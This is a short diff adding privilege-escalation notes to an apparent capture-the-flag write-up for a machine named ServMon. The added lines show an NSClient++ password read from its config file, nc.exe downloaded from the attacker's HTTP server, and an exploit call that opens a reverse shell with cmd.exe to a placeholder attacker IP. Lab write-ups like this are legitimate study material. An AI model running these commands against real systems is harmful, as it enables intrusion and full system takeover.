@@ -105,4 +105,17 @@ nadine@SERVMON C:\Users\Nadine\Desktop>type user.txt
 ============================================
 Privelege Escalation
 ============================================
+nadine@SERVMON C:\Program Files\NSClient++>type nsclient.ini
+
+; in flight - TODO
+[/settings/default]
+
+; Undocumented key
+password = ew2x6SsGTxjRwXOT
+
+Upload netcat on the box:
+└─# python3 -m http.server 80
+nadine@SERVMON C:\Users\Nadine\Desktop>powershell -c "curl http://10.10.14.11/nc.exe -o nc.exe"
+
+└─# python exploit.py -t 10.10.10.184 -P 8443 -p 'ew2x6SsGTxjRwXOT' -c "nc.exe -e cmd.exe <Attacker_IP> <PORT>"
 
